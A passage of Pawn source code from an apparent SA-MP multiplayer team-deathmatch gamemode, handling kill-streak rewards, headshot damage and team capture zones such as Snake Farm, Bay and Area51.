		new weaponid = GetPlayerWeapon(killerid);
		switch(weaponid)
		{
			case 2 .. 15: GivePlayerWeapon(killerid, GetPlayerWeapon(killerid), 1);
			case  16 .. 18: GivePlayerWeapon(killerid, GetPlayerWeapon(killerid), 1);
			case 22 .. 32: GivePlayerWeapon(killerid, GetPlayerWeapon(killerid), 60);
			case 35 .. 46: GivePlayerWeapon(killerid, GetPlayerWeapon(killerid), 1);
		}
//		SetPlayerScore(killerid, GetPlayerScore(killerid) +1);
		GivePlayerScore(killerid, 5);
        Streak[playerid] = 0;
        Streak[playerid] = 0;
    if(killerid != INVALID_PLAYER_ID)
    {//fix+opt switched to switch case structure for better optimisation and used math to make the code smaller, fixed minor display bugs and
   		new KillerName[MAX_PLAYER_NAME];
        GetPlayerName(killerid, KillerName, sizeof(KillerName));
        new text[128];
        new pmes[128];
        Streak[killerid] ++;
        Skills[killerid] ++;
        RoundInfo[killerid][Kills] ++;
		switch (Streak[killerid])
		{
			case 3:
			{
			    format(text, sizeof(text), "%s is on a killing spree of 3 kills!", PlayerName2(killerid));
              //	PlayAudioStreamForPlayer(killerid, "http://picosong.com/media/songs/db765608b05afc72e0a8a2965f82f8f5/triplekill.mp3");
                SendBoxMessage(text);
                SendClientMessageToAll(C_PINK, text);
                #if defined IRCENABLED
                format(text, sizeof(text), "13[SPREE]1%s is on a killing spree of 4[31 kills!",PlayerName2(killerid));
                IRC_GroupSay(gGroupID, IRC_CHANNEL, text);
                #endif
                format(text, sizeof(text), "%s is on a killing spree of 3 kills!", PlayerName2(killerid));
                SendClientMessage(killerid, lightblue, "You get $1000 and 1 score! (killing spree bonus)");
                GivePlayerMoney(killerid, 1000);
                GivePlayerScore(killerid, 1);
                RewardTrackForPlayer(killerid);//samp sound (with termination)
			}
			case 5, 10, 15, 20, 25:
			{
				format(text, sizeof(text), "%s is on a killing spree of %d kills!", PlayerName2(killerid), Streak[killerid]);
                   //	PlayAudioStreamForPlayer(killerid, "http://picosong.com/media/songs/07ceb2f3ce93be7bfbe0a7cc3de09d64/dominating.mp3");
                SendBoxMessage(text);
                SendClientMessageToAll(C_PINK, text);
                #if defined IRCENABLED
                format(text, sizeof(text), "13[SPREE]1%s is on a killing spree of 4[%d]1 kills!",PlayerName2(killerid), Streak[killerid]);
                IRC_GroupSay(gGroupID, IRC_CHANNEL, text);
                #endif
                format(pmes, sizeof(pmes), "You get $%d and %d score! (killing spree bonus)", 2000*Streak[killerid] / 5, 2*Streak[killerid] / 5);
                SendClientMessage(killerid, lightblue, pmes);
				GivePlayerMoney(killerid, 2000*(Streak[killerid] / 5));
                GivePlayerScore(killerid, 2*(Streak[killerid] / 5));
            	RewardTrackForPlayer(killerid);//samp sound (with termination)
			}
			case 50, 75, 100:
			{
				format(text, sizeof(text), "%s is on a killing spree of %d kills!", PlayerName2(killerid), Streak[killerid]);
                   //	PlayAudioStreamForPlayer(killerid, "http://picosong.com/media/songs/07ceb2f3ce93be7bfbe0a7cc3de09d64/dominating.mp3");
                SendBoxMessage(text);
                SendClientMessageToAll(C_PINK, text);
                #if defined IRCENABLED
                format(text, sizeof(text), "13[SPREE]1%s is on a killing spree of 4[%d]1 kills!",PlayerName2(killerid), Streak[killerid]);
                IRC_GroupSay(gGroupID, IRC_CHANNEL, text);
                #endif
            	format(pmes, sizeof(pmes), "You get $%d and %d score! (killing spree bonus)", 5000*Streak[killerid] / 25, 5*Streak[killerid] / 25);
                SendClientMessage(killerid, lightblue, pmes);
                GivePlayerMoney(killerid, 5000*(Streak[killerid] / 25));
                GivePlayerScore(killerid, 5*(Streak[killerid] / 25));
                RewardTrackForPlayer(killerid);//samp sound (with termination)
			}
			case 150:
			{
				format(text, sizeof(text), "%s is on a killing spree of 150 kills!", PlayerName2(killerid));
                   //	PlayAudioStreamForPlayer(killerid, "http://picosong.com/media/songs/07ceb2f3ce93be7bfbe0a7cc3de09d64/dominating.mp3");
                SendBoxMessage(text);
                SendClientMessageToAll(C_PINK, text);
                #if defined IRCENABLED
                format(text, sizeof(text), "13[SPREE]1%s is on a killing spree of 4[150]1 kills!",PlayerName2(killerid));
                IRC_GroupSay(gGroupID, IRC_CHANNEL, text);
                #endif
                SendClientMessage(killerid, lightblue, "You get $40000 and 40 score! (killing spree bonus)");
                GivePlayerMoney(killerid, 40000);
                GivePlayerScore(killerid, 40);
                RewardTrackForPlayer(killerid);//samp sound (with termination)
                Streak[killerid]=0;
			}
		}
	}
/*
        if(StealingA69Prot[playerid] == 1)
		{
  		SendClientMessage(playerid, 0x00BFFFAA, "You failed stealing the Area69 Prototype!");
  		RemovePlayerMapIcon(playerid,1);
  		GivePlayerMoney(playerid, -500);
  		StealingA69Prot[playerid] = 0;
  		new pname[24];
  		GetPlayerName(playerid, pname, 24);
  		new kk[128];
  		format(kk, sizeof(kk), "** %s (%d) failed stealing Area69 Prototype!",pname,playerid);
		SendClientMessageToAll(0xC93CCE00,kk);
		SetPVarInt(playerid,"StealingTime",GetTickCount()+600000);
  		}
*/
        PlayerInfo[killerid][Kills] ++;
     	#if defined ENABLE_SPEC
		foreach(Player, x)
		{
		    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][SpecID] == playerid)
		       AdvanceSpectate(x);
		}
		#endif
		return 1;
}
stock RewardTrackForPlayer(playerid)
{
    new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
    PlayerPlaySound(playerid, 1185, x, y, z);
    RewardSoundEnd[playerid] = SetTimerEx("cancelrev", 10000, false, "d", playerid);
	return 1;
}
forward cancelrev(playerid);
public cancelrev(playerid)
{
    new Float:x, Float:y, Float:z;
	GetPlayerPos(playerid, x, y, z);
    PlayerPlaySound(playerid, 1186, x, y, z);
    KillTimer(RewardSoundEnd[playerid]);
	return 1;
}
stock GivePlayerScore(playerid, score)
{
    SetPlayerScore(playerid, GetPlayerScore(playerid)+score);
	return 1;
}

public destroyThisObject(objid)
{
	DestroyObject(objid);
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
if(gTeam[issuerid] == gTeam[playerid])
	{
        new Float:hps[MAX_PLAYERS];
	    GetPlayerHealth(issuerid, hps[issuerid]);
	    SetPlayerHealth(issuerid, hps[issuerid]);
    	GameTextForPlayer(issuerid,"~r~Same Team", 3000, 3);
	}

	if(issuerid != INVALID_PLAYER_ID)
	{
	  	new str[26];
	  	format(str, sizeof(str),"-%.0f", amount);
      	SetPlayerChatBubble(playerid, str, 0xFF0000FF, 100.0, 2000);
      	PlayerPlaySound(issuerid,17802,0.0,0.0,0.0);
	}
	new Float:x, Float:y, Float:z;
	if(PlayerInfo[playerid][OnDuty] == 1 || PlayerInfo[playerid][God] == 1)
	{
		    SetPlayerHealth(playerid, 100000000.0);
		    new Float:Health; GetPlayerHealth(issuerid,Health);
		    GameTextForPlayer(issuerid,"~w~dont~n~~p~Attack~n~~p~onduty~n~~w~admins", 3000, 3);
		    GetPlayerPos(issuerid,x,y,z); SetPlayerPos(issuerid,x,y,z+5);
        	}
    if(gTeam[issuerid] != gTeam[playerid])
    {
		if(PlayerInfo[playerid][OnDuty] == 1 || PlayerInfo[playerid][God] == 1)
		{
		    SetPlayerHealth(playerid, 100000000.0);
		    new Float:Health; GetPlayerHealth(issuerid,Health);
		    GameTextForPlayer(issuerid,"~w~dont~n~~p~Attack~n~~p~onduty~n~~w~admins", 3000, 3);
		    GetPlayerPos(issuerid,x,y,z); SetPlayerPos(issuerid,x,y,z+5);
     	}
 		else if(issuerid != INVALID_PLAYER_ID && weaponid != 34 && weaponid != 0 && bodypart == 9)
    	{
        	// One shot to the head to kill with sniper rifle
        	if(hs_normal == 1)
        	{
       		GameTextForPlayer(issuerid,"~g~ Enemy was headshoted", 3000, 3);
        	GameTextForPlayer(playerid,"~r~ You have been headshoted by the enemy", 3000, 3);
        	SendClientMessage(issuerid, lightblue, "You get $200 and +2 score! (killing spree bonus)");
         	GivePlayerMoney(issuerid, 200);
          	GivePlayerScore(issuerid, 1);
        	SetPlayerHealth(playerid, 0.0);
        	}
    	}
   		else if(issuerid != INVALID_PLAYER_ID && weaponid == 34 && weaponid != 0 && bodypart == 9)
    	{
        	// One shot to the head to kill with sniper rifle
        	if(hs_sniper == 1)
        	{
        	GameTextForPlayer(issuerid,"~g~ Enemy was headshoted", 3000, 3);
        	GameTextForPlayer(playerid,"~r~ You have been headshoted by a ~p~pro Sniper", 3000, 3);
        	SendClientMessage(issuerid, lightblue, "You get $20000 and +20 score! (killing spree bonus)");
         	GivePlayerMoney(issuerid, 300);
          	GivePlayerScore(issuerid, 1);
        	SetPlayerHealth(playerid, 0.0);
        	}
    	}
    }
    return 1;
}
//================================CAPTURE ZONES=================================
stock CaptureZoneMessage(playerid, messageid)
{
	switch(messageid)
	{
	   case 1:
	   {
		   SendClientMessage(playerid, red,"You cannot capture while in a vehicle!");
	   }
	   case 2:
	   {
           SendClientMessage(playerid, red,"This zone is already being taken over!");
	   }
	   case 3:
	   {
           SendClientMessage(playerid, red,"You can't capture area's while on adminduty!");
       }
	}
	return 1;
}
//===============SNAKE FARMS====================================================
stock ActiveSnakeFarm(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[SNAKE] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{
                for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[SNAKE] = 1;
			 	timer[playerid][SNAKE] = SetTimerEx("SnakeFarm", 25000, false,"i",playerid);
			 	Captured[playerid][SNAKE] = 0;
			 	SendClientMessage(playerid, C_PINK,"Stay in this checkpoint for 25 seconds to capture!");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_AUS_COLOR);
				}
				else if(gTeam[playerid] == TEAM_MARVEL)
				{
			      GangZoneFlashForAll(Zone[SNAKE], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[SNAKE] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, C_LORANGE,"[ZONE-ATTACK]Snakes Farm is under attack.");
			    }
			    else if(tCP[SNAKE] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, C_LORANGE,"[ZONE-ATTACK]Snakes Farm is under attack.");
			    }
			    else if(tCP[SNAKE] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, C_LORANGE,"[ZONE-ATTACK]Snakes Farm is under attack.");
				}
				else if(tCP[SNAKE] == TEAM_MARVEL)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<Vietnam>");
			      SendTeamMessage(TEAM_MARVEL, C_LORANGE,"[ZONE-ATTACK]Snakes Farm is under attack.");
				}
				else if(tCP[SNAKE] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, C_LORANGE,"[ZONE-ATTACK]Snakes Farm is under attack.");
				}
				else if(tCP[SNAKE] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE-INFO]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, C_LORANGE,"[ZONE-ATTACK]Snakes Farm is under attack.");
				}
				else if(tCP[SNAKE] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
    			foreach(Player, i)
				{
				   IsPlayerCapturing[i][SNAKE] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock SnakeFarmCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][SNAKE] = 1;
	UnderAttack[SNAKE] = 0;
	KillTimer(timer[playerid][SNAKE]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][SNAKE] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
	GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);

	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][SNAKE] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Snakes farm"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[SNAKE] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[SNAKE]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_AUS_COLOR);
    }
    else if(gTeam[playerid] == TEAM_MARVEL)
    {
	   GangZoneShowForAll(Zone[SNAKE], TEAM_ZONE_MARVEL_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"~y~[ZONE]%s has captured ~b~Snakes Farm ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Snakes Farm 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
	return 1;
}
stock LeavingSnakeFarm(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][SNAKE] = 1;
	UnderAttack[SNAKE] = 0;
	KillTimer(timer[playerid][SNAKE]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][SNAKE] = 25;
    GangZoneStopFlashForAll(Zone[SNAKE]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][SNAKE] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://picosong.com/fB6m/");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward SnakeFarm(playerid);
public SnakeFarm(playerid)
{
	SnakeFarmCaptured(playerid);
	return 1;
}
//===============================[BAY]==========================================
stock ActiveBay(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[BAY] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[BAY] = 1;
			 	timer[playerid][BAY] = SetTimerEx("Bay", 25000, false,"i",playerid);
			 	Captured[playerid][BAY] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_AUS_COLOR);
				}
				else if(gTeam[playerid] == TEAM_MARVEL)
				{
			      GangZoneFlashForAll(Zone[BAY], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[BAY] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, C_LORANGE,"[ZONE-ATTACK]Bay is under attack.");
			    }
			    else if(tCP[BAY] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, C_LORANGE,"[ZONE-ATTACK]Bay is under attack.");
			    }
			     else if(tCP[BAY] == TEAM_MARVEL)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<VIETNAM>");
			      SendTeamMessage(TEAM_MARVEL, C_LORANGE,"[ZONE-ATTACK]Bay is under attack.");
			    }

			    else if(tCP[BAY] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, C_LORANGE,"[ZONE-ATTACK]Bay is under attack.");
				}
				else if(tCP[BAY] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, C_LORANGE,"[ZONE-ATTACK]Bay is under attack.");
				}
				else if(tCP[BAY] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, C_LORANGE,"[ZONE-ATTACK]Bay is under attack.");
				}
				else if(tCP[BAY] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][BAY] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock BayCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][BAY] = 1;
	UnderAttack[BAY] = 0;
	KillTimer(timer[playerid][BAY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BAY] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][BAY] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Bay"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[BAY] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[BAY]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[BAY], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[BAY], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[BAY], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[BAY], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[BAY], TEAM_ZONE_AUS_COLOR);
    }
    	else if(gTeam[playerid] == TEAM_MARVEL)
    {
	   GangZoneShowForAll(Zone[BAY], TEAM_ZONE_MARVEL_COLOR);
    }

    //==========================================================================
    new str[128];
    format(str, sizeof(str),"~y~[ZONE]%s has captured ~b~Bay ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Bay 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
	#endif
	return 1;
}
stock LeavingBay(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][BAY] = 1;
	UnderAttack[BAY] = 0;
	KillTimer(timer[playerid][BAY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BAY] = 25;
    GangZoneStopFlashForAll(Zone[BAY]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][BAY] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward Bay(playerid);
public Bay(playerid)
{
	BayCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveArea51(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[BIG] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[BIG] = 1;
			 	timer[playerid][BIG] = SetTimerEx("Area51", 25000, false,"i",playerid);
			 	Captured[playerid][BIG] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_AUS_COLOR);
				}
				else if(gTeam[playerid] == TEAM_MARVEL)
				{
			      GangZoneFlashForAll(Zone[BIG], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[BIG] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, C_LORANGE,"[ZONE-ATTACK]Area51 is under attack.");
			    }
			    else if(tCP[BIG] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, C_LORANGE,"[ZONE-ATTACK]Area51 is under attack.");
			    }
			    else if(tCP[BIG] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, C_LORANGE,"[ZONE-ATTACK]Area51 is under attack.");
				}
				else if(tCP[BIG] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, C_LORANGE,"[ZONE-ATTACK]Area51 is under attack.");
				}
				else if(tCP[BIG] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, C_LORANGE,"[ZONE-ATTACK]Area51 is under attack.");
				}
				else if(tCP[BIG] == TEAM_MARVEL)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<VIETNAM>");
			      SendTeamMessage(TEAM_MARVEL, C_LORANGE,"[ZONE-ATTACK]Area51 is under attack.");
				}
				else if(tCP[BIG] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][BIG] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock Area51Captured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][BIG] = 1;
	UnderAttack[BIG] = 0;
	KillTimer(timer[playerid][BIG]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BIG] = 25;
    GivePlayerScore(playerid, 10);
    GivePlayerMoney(playerid, 5000);
	SendClientMessage(playerid, COLOR_WHITE,"You got +7 scores and +$5000 cash for this area!");
	SendClientMessage(playerid, COLOR_WHITE,"You have captured Area 51 you got an Extra +3 score!");
	GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][BIG] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Area51"cwhite"! You received +3 score for it!");
		   GivePlayerScore(i, 3);
	   }
	}
	//==========================================================================
	tCP[BIG] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[BIG]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[BIG], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[BIG], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[BIG], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[BIG], TEAM_ZONE_USA_COLOR);
	}
		else if(gTeam[playerid] == TEAM_MARVEL)
	{
	   GangZoneShowForAll(Zone[BIG], TEAM_ZONE_MARVEL_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[BIG], TEAM_ZONE_AUS_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"~y~[ZONE]%s has captured ~b~Area51 ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Area 51 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
	return 1;
}
stock LeavingArea51(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][BIG] = 1;
	UnderAttack[BIG] = 0;
	KillTimer(timer[playerid][BIG]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BIG] = 25;
    GangZoneStopFlashForAll(Zone[BIG]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][BIG] = 0;
	}
